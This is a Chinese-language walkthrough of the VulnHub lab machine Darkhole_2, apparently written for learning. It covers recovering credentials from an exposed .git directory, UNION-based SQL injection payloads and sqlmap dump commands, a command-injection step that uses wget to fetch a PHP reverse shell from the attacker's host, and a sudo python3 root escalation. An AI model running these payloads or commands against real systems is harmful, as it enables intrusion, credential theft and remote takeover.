vulnhub之Darkhole_2

0x001 前言

大家快来看，我成功研究出来了Darkhole_2整个最新靶机的全过程

希望大家来观看，他是一个基于sql注入和系统提权的全过程，作者将他标记位hard，请大家观看我的操作

0x002操作过程

首先进行ip扫描

于是我对这个ip进行协议扫描

nmap -sC -sV 192.168.181.161 -p- -v --min-rate=2000

由于打开80端口，于是我打开网页进行查看
由于我在端口协议扫描的时候，我发现一个目录192.168.181.161:80/.git/，于是打开进行查看

由于一些文件无法查看，于是我将其下载到kali本地

wget -r 192.168.181.161:80/.git/

下载完毕，于是进行查看，我们可以看到网页的源码

由于我们已经有了git库

于是我使用git clone . webapp，来进行复制

于是我在login.php的文件中看见了，用户登录的逻辑

正如我们上面看到的，对于sql语句的输入都有一些过滤，于是我们无法进行sql注入，于是在.git文件下，看到了一些证据

git log

我们在git日志中，看到了第二次提交的依据，要将HEAD切换到master

git checkout a4d9

cat login.php

于是我们知道了登录的用户名和密码，于是到login.php进行登录

登录成功，由于上文中login.php的文件中登录成功后，就会执行sql语句，于是我尝试进行sql注入，又两种方法可以注入，一是通过手工注入和sqlmap进行注入

一、手工注入

现在id后输入Null

于是我在Null后加‘，于是我猜测数据库中至少有5列

于是进行猜测数据库中有几列，使用order by

1' ORDER BY 6 -- -（有反应）

1' ORDER BY 7 -- - （无反应）

于是查看回显位是哪个


id=NULL' UNION ALL SELECT 1,2,3,4,5,6 -- -

于是发现2，3，5，6是回显位，于是进行数据库爆破

id=NULL' UNION ALL SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6 FROM information_schema.schemata -- -

查看数据中的表

NULL' UNION ALL SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema='darkhole_2'-- -

查看数据库中的所有列名

NULL' UNION ALL SELECT 1,GROUP_CONCAT(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='ssh'-- -

于是获取数据的用户名和密码

可以进行ssh登录

二、sqlmap破解

首先进行抓包获取cookie

于是进行sqlmap爆破数据库


sqlmap -u http://192.168.181.161/dashboard.php?id=1 --cookie PHPSESSID=qkh83d1p9tr11bg7kgrvoo3nmu --current-db

进行数据库表名爆破


sqlmap -u http://192.168.181.161/dashboard.php?id=1 --cookie PHPSESSID=qkh83d1p9tr11bg7kgrvoo3nmu -D darkhole_2 --tables

进行数据库用户名密码爆破

sqlmap -u http://192.168.181.161/dashboard.php?id=1 --cookie PHPSESSID=qkh83d1p9tr11bg7kgrvoo3nmu -D darkhole_2 -T ssh -dump

于是进行ssh登录

ssh jehad@192.168.181.161

进行提权

cat .bash_history

在查看历史记录时，发现提权方法

于是我到/opt/web下发现一个index.php的文件

我又在/etc/crontab 下发现一个用户

发现cmd是可以运行的，于是使用连接远程端口

ssh -L 9999:127.0.0.1:9999 jehad@192.168.181.161

查看端口是否已经打开

9999端口已经打开，于是查看id

curl "http://127.0.0.1:9999/?cmd=id"

于是上传shell，进行反弹，首先在kali开启http端口

于是下载到靶机，上传shell

curl "http://127.0.0.1:9999/?cmd=wget%20192.168.181.129:6666/11.php"

11.php就是我们经常使用php-reverse-shell.php，于是运行shell，并进行监听

运行shell命令

curl "http://127.0.0.1:9999/11.php"

于是发现第一个flag

我又在历史文件里发现了密码

cat .bash_history

于是进行ssh登录

ssh losy@192.168.181.161

于是进行提权

sudo -l

sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

于是获得root权限

于是获得最终flag


0x003 总结

我通过靶机学会了新的sql注入的方法，以及通过开启本地端口来执行命令；谢谢大家观看！
